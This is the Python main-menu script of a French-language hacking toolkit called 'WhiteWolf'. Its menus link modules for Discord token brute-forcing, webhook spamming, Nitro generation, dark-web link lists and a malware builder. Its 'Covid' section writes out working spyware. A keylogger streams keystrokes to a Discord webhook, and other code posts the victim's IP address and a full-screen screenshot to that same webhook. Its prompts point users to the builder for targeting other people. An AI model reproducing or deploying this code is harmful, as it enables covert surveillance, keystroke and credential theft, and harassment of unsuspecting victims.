import os
import time
import requests
import webbrowser
import json
import msvcrt
import tempfile
import subprocess
from pypresence import Presence,DiscordNotFound
import random
import string
import base64
from api import api_ip, api_number, api_dns
from sites import sites
from darkweb import links
from pynput import keyboard
import threading
import io
import mss
import mss.tools
import whois
import os
import subprocess
from tkinter import Tk, filedialog
from code.discordchecker import main as discord_checker
from code.tiktokchecker import tiktok
from code.githubchecker import git
from builder import builder
from code.genip import ip
from code.Spamtlgrm import tlgrm
from code.passwordmanager import passwdmanage
from code.challange.firstchallange import osint
from code.challange.pentestchallange import main as pentest_web
from code.ipscanner import ip
from code.letsenscript import domaine
from code.robloxsearch import roblox
from code.ai import ai
from code.checking import holehe
from code.rpc import rpc_conf
from code.webcamcapt import webcam
from pyfiglet import Figlet
from code.tokencheck import tokenchecker
from code.embedsender import sender
from code.colors import *
from code.ipreputation import ip_reputation
from code.autofollowinsta import instaautomation
from code.ip import ipchoix
from code.number import numberchoix
from code.username import fulluser_name
from code.googlesearching import googlesearch
from code.dnslookup import dnslookup
from code.discord import discord_lookup
from code.github import githubbb
from code.leak import leak
from code.archive import archive
from code.vpn import vpn
from code.password import password
from code.webstatus import webstatus
from code.scraper import scraper
from code.whois import whois
from code.nitro import nitro
from code.webhookspaming import webhookspam
from code.idtotoken import idtotoken
from code.invitbot import invit

def rpc():
    try:
        rpc = Presence("1441226984024965221")
        rpc.connect()

        rpc.update(
            state="White Wolf",
            details="Best Tools",
            large_image="tools",
            large_text="by xql",
            buttons=[
                {
                    "label": "Repository",
                    "url": "https://github.com/Python-loving/WHITEWOLF-TOOLS"
                },
                {
                    "label": "Telegram",
                    "url": "https://t.me/whitewolf_tools"
                }
            ]
        )

        while True:
            time.sleep(15)

    except DiscordNotFound:
        return

def devtools():
    os.system("cls")
    choix = input(f"""{MAGENTA}
    ████▄  ██████ ██  ██ ██████ ▄████▄ ▄████▄ ██     ▄█████ 
    ██  ██ ██▄▄   ██▄▄██   ██   ██  ██ ██  ██ ██     ▀▀▀▄▄▄ 
    ████▀  ██▄▄▄▄  ▀██▀    ██   ▀████▀ ▀████▀ ██████ █████▀ 
                                                        
    Devtools for xql : """)
    f = Figlet(font="slant")
    print(f.renderText(choix))

# Just for xql ( devtools() )

# ANCHOR - Command thread 
threading.Thread(target=rpc, daemon=True).start()

def show_informations():
    os.system("cls")
    print(f"""{RED} Informations {RED}
            Telegram - https://t.me/whitewolf_tools
            Gunslol - https://guns.lol/xqldev
        """)
    time.sleep(5)

while True:
    os.system("cls")
    choix = input(f""" {WHITE}
            ██╗    ██╗██╗  ██╗██╗████████╗███████╗██╗    ██╗ ██████╗ ██╗     ███████╗
            ██║    ██║██║  ██║██║╚══██╔══╝██╔════╝██║    ██║██╔═══██╗██║     ██╔════╝
            ██║ █╗ ██║███████║██║   ██║   █████╗  ██║ █╗ ██║██║   ██║██║     █████╗  
            ██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██║███╗██║██║   ██║██║     ██╔══╝  
            ╚███╔███╔╝██║  ██║██║   ██║   ███████╗╚███╔███╔╝╚██████╔╝███████╗██║     
             ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝     
        [I]. Informations                                      

            1. [Lookup]    4. [Covid]
            2. [Sécurity]  5. [Automation]
            3. [Discord]   6. [Quit]

            Fais ton choix : """).lower()
        
    if  choix == "1":
        os.system("cls")
        choix2 = input(f""" {WHITE}
                            ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
                            ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
                            ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝
                            ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝ 
                            ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║     
                            ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     
                    [I]. Informations                                      

                            1. [IP]          4. [Google]      7. [Github]      10. [4C Tiktok]  13. [SSL / TLS]    16. [Holehe]
                            2. [Number]      5. [Dns]         8. [Leak Mail]   11. [4C Github]  14. [Roblox]       17. [Quit]
                            3. [Username]    6. [DISCORD]     9. [Archive Web] 12. [IP Scanner] 15. [AI]

                            Fais ton choix : """).lower()
        if choix2 == "1":
            ipchoix()

        elif choix2 == "2":
            numberchoix()

        elif choix2 == "3":
            fulluser_name()

        elif choix2 == "4":
            googlesearch()

        elif choix2 == "5":
            dnslookup()

        elif choix2 == "6":
            discord_lookup()

        elif choix2 == "7":
            githubbb()

        elif choix2 == "8":
            leak()
        
        elif choix2 == "9":
            archive()

        elif choix2 == "10":
            tiktok()
        
        elif choix2 == "11":
            git()
        
        elif choix2 == "12":
            ip()
        
        elif choix2 == "13":
            domaine()

        elif choix2 == "14":
            roblox()

        elif choix2 == "15":
            ai()

        elif choix2 == "16":
            holehe()

        elif choix2 == "i":
            show_informations()

        elif choix2 == "17":
            print("Tu va quitté le tools")
            time.sleep(2)
            print("Au-Revoir :)")
            time.sleep(2)
            break

    # Menu sécurity
    elif choix == "2":
        os.system("cls")
        choix3 = input(f""" {WHITE}
        ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
        ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
        ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
        ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
        ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
        ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
    [I]. Informations    
        1. [PROXY(VPN)]     4. [Scraper] 7. [Spam Telegram]  10. [Pentest Web]  13. [Quit]
        2. [Gen Password]   5. [Whois]   8. [Passwd Manager] 11. [Webcam]
        3. [Status Website] 6. [Gen IP]  9. [Osint]          12. [Ip reput]
            {WHITE}
        Fais ton choix : """).lower()

        if choix3 == "1":
            vpn()
        
        elif choix3 == "2":
            password()

        elif choix3 == "3":
            webstatus()

        elif choix3 == "4":
            scraper()
        
        elif choix3 == "5":
            whois()

        elif choix3 == "6":
            ip()

        elif choix3 == "7":
            tlgrm()
        
        elif choix3 == "8":
            passwdmanage()

        elif choix3 == "9":
            osint()

        elif choix3 == "10":
            pentest_web()
        
        elif choix3 == "11":
            webcam()
        
        elif choix3 == "12":
            ip_reputation()

        elif choix3 == "i":
            show_informations()

        elif choix3 == "13":
            print("Au-Revoir a bientot l'amis")
            time.sleep(2)
            break
    # catgegories
    elif choix == "3":
        os.system("cls")
        discord = input(f""" {WHITE}
            ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
            ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
            ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
            ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
            ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
            ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
        [I]. Informations               

            1. [Nitro Gen]       4. [Token BruteForce]  7. [rpc_conf]   10. [Quit]
            2. [Spaming Webhook] 5. [Bot to id]         8. [Token check]
            3. [Darkweb]         6. [4c Checker]        9. [Webhook sender]
                {WHITE}
            Choisis : """).lower()

        # Nitro gen
        if discord == "1":
            nitro()

        # Webhook
        elif discord == "2":
            webhookspam()

        elif discord == "3":
            os.system("cls")
            print("""
                ██████╗  █████╗ ██████╗ ██╗  ██╗    ██╗    ██╗███████╗██████╗ 
                ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██║    ██║██╔════╝██╔══██╗
                ██║  ██║███████║██████╔╝█████╔╝     ██║ █╗ ██║█████╗  ██████╔╝
                ██║  ██║██╔══██║██╔══██╗██╔═██╗     ██║███╗██║██╔══╝  ██╔══██╗
                ██████╔╝██║  ██║██║  ██║██║  ██╗    ╚███╔███╔╝███████╗██████╔╝
                ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚══════╝╚═════╝  
                """)
            try:
                for category, content in links.items():
                    print(f"\n--- {category} ---")

                    for name, url in content.items():

                        if isinstance(url, dict):
                            print(f"\n  [{name}]")
                            for sub_name, sub_url in url.items():
                                print(f"   - {sub_name} : {sub_url}")
                        else:
                            print(f"  - {name} : {url}")
            except Exception as e:
                print(f"Error {e}")

            time.sleep(10)
        elif discord == "4":
            idtotoken()

        elif discord == "5":
            invit()

        elif discord == "6":
            discord_checker()
            
        elif discord == "7":
            rpc_conf()
        
        elif discord == "8":
            tokenchecker()
        
        elif discord == "9":
            sender()
        
        elif discord == "i":
            show_informations()

        elif discord == "10":
            print("Aurevoir l'amis")
            time.sleep(2)
            break
            
    elif choix == "4":
        try:
            os.system("cls")
            covid = input(f""" {WHITE}
                 ██████╗ ██████╗ ██╗   ██╗██╗██████╗      ██╗ █████╗ 
                ██╔════╝██╔═══██╗██║   ██║██║██╔══██╗    ███║██╔══██╗
                ██║     ██║   ██║██║   ██║██║██║  ██║    ╚██║╚██████║
                ██║     ██║   ██║╚██╗ ██╔╝██║██║  ██║     ██║ ╚═══██║
                ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝     ██║ █████╔╝
                ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝      ╚═╝ ╚════╝ 
                
                1. [KeyLogger]  4. [Build Covid]
                2. [Grabing IP] 5. [Quit]
                3. [ScreenShot]

                    {WHITE}
                Fais ton choix : """)
        except ValueError as e:
            print(f"Error {e}")
        
        if covid == "1":
            try:
                os.system("cls")
                webhook_choice = input(f"""{BLUE}

                ▄████▄   ▒█████   ██▒   █▓ ██▓▓█████▄     ██▓     ▒█████    ▄████ ▓█████  ██▀███  
                ▒██▀ ▀█  ▒██▒  ██▒▓██░   █▒▓██▒▒██▀ ██▌   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
                ▒▓█    ▄ ▒██░  ██▒ ▓██  █▒░▒██▒░██   █▌   ▒██░    ▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
                ▒▓▓▄ ▄██▒▒██   ██░  ▒██ █░░░██░░▓█▄   ▌   ▒██░    ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
                ▒ ▓███▀ ░░ ████▓▒░   ▒▀█░  ░██░░▒████▓    ░██████▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
                ░ ░▒ ▒  ░░ ▒░▒░▒░    ░ ▐░  ░▓   ▒▒▓  ▒    ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
                ░  ▒     ░ ▒ ▒░    ░ ░░   ▒ ░ ░ ▒  ▒    ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
                ░        ░ ░ ░ ▒       ░░   ▒ ░ ░ ░  ░      ░ ░   ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░ 
                ░ ░          ░ ░        ░   ░     ░           ░  ░    ░ ░        ░    ░  ░   ░     
                ░                      ░        ░                                                  
                            {BLUE}
                Met ton webhook (Pour tester sur des gens autre que vous allez sur le covid builder): """)
            except ValueError as e:
                print(f"Error {e}")

            os.system("cls")

            webhook = webhook_choice

            buffer = ""
            timer = None

            def send_buffer():
                global buffer

                if buffer:
                    data = {
                        "content": buffer,
                        "username": "WhiteWolf",
                        "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                    }

                    requests.post(webhook, json=data)
                    buffer = ""

            def reset_timer():
                global timer
                if timer:
                    timer.cancel()

                timer = threading.Timer(1.0, send_buffer)  
                timer.start()

            def on_press(key):
                global buffer

                try:
                    char = key.char
                    buffer += char

                except AttributeError:
                    if key == keyboard.Key.space:
                        buffer += " "
                    elif key == keyboard.Key.enter:
                        buffer += "\n"
                reset_timer()

            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            listener.join()
        
        elif covid == "2":
            os.system("cls")
            try:
                ip_grabing = input("""
                     ██████╗ ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗     ██╗██████╗ 
                    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝     ██║██╔══██╗
                    ██║  ███╗██████╔╝███████║██████╔╝██║██╔██╗ ██║██║  ███╗    ██║██████╔╝
                    ██║   ██║██╔══██╗██╔══██║██╔══██╗██║██║╚██╗██║██║   ██║    ██║██╔═══╝ 
                    ╚██████╔╝██║  ██║██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝    ██║██║     
                     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝╚═╝     
                        
                    Met Ton webhook (Pour tester sur des gens autre que vous allez sur le covid builder) : """)
            except ValueError as e:
                print(f"Error {e}")
                
            webhook = ip_grabing

            try:
                ip = requests.get("https://checkip.amazonaws.com").text.strip()
             #  print(ip)
                data = {
                    "content": ip,
                    "username": "WhiteWolf",
                    "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                }
                requests.post(webhook, json=data)
            except ValueError:
                print("Value error")
                time.sleep(3)
        elif covid == "3":
            os.system("cls")
            try:
                screen = input(""" {RED}
                    ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗
                    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║
                    ███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║
                    ╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║
                    ███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║
                    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝
                    Met Ton webhook discord (Pour tester sur des gens autre que vous allez sur le covid builder): """)
            except ValueError as e:
                print(f"Error {e}")

            webhook = screen
            with mss.MSS() as sct:
                img = sct.grab(sct.monitors[1])

                img_bytes = mss.tools.to_png(img.rgb, img.size)

                files = {
                    "file": ("screen.png", io.BytesIO(img_bytes), "image/png")
                }

                requests.post(webhook, data={
                "content": "screenshot", 
                "username": "WhiteWolf", 
                "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                }, files=files)
        elif covid == "4":
            try:
                os.system("cls")
                webhook = input(f"""{MAGENTA}
                                                                                
                ██  ██ ██ █████▄  ██  ██ ▄█████   █████▄ ██  ██ ██ ██     ████▄  
                ██▄▄██ ██ ██▄▄██▄ ██  ██ ▀▀▀▄▄▄   ██▄▄██ ██  ██ ██ ██     ██  ██ 
                 ▀██▀  ██ ██   ██ ▀████▀ █████▀   ██▄▄█▀ ▀████▀ ██ ██████ ████▀  
                
                Met Ton Webhook : """)
            except ValueError as e:
                print(f"Error {e}")

            with open("config.json", "w", encoding="utf-8") as f:
                json.dump({"webhook": webhook}, f, ensure_ascii=False, indent=4)
                
            builder()

        elif covid == "5":
            print("Au-Revoir a bientot l'amis")
            time.sleep(2)
            break
    elif choix == "5":
        automation = input(f"""{MAGENTA}
        ▄████▄ ██  ██ ██████ ▄████▄ ██▄  ▄██ ▄████▄ ██████ ██ ▄████▄ ███  ██ 
        ██▄▄██ ██  ██   ██   ██  ██ ██ ▀▀ ██ ██▄▄██   ██   ██ ██  ██ ██ ▀▄██ 
        ██  ██ ▀████▀   ██   ▀████▀ ██    ██ ██  ██   ██   ██ ▀████▀ ██   ██ 
                                                                        
        i. [Information]

        1. [Instagram Auto Follow]           
        2. [Quit]
                        
                            
        Fais ton choix : """)
        
        if automation == "1":
            instaautomation()
        elif automation == "2":
            print(f"Tu va quitté")
            time.sleep(3)
            break
        elif automation == "i":
            show_informations()

    # Ici on a mis le quit si la personne a lancé sans fair expres
    elif choix == "6":
        print("Au-Revoir a bientot l'ami")
        time.sleep(2)
        break
    elif choix == "i":
        show_informations()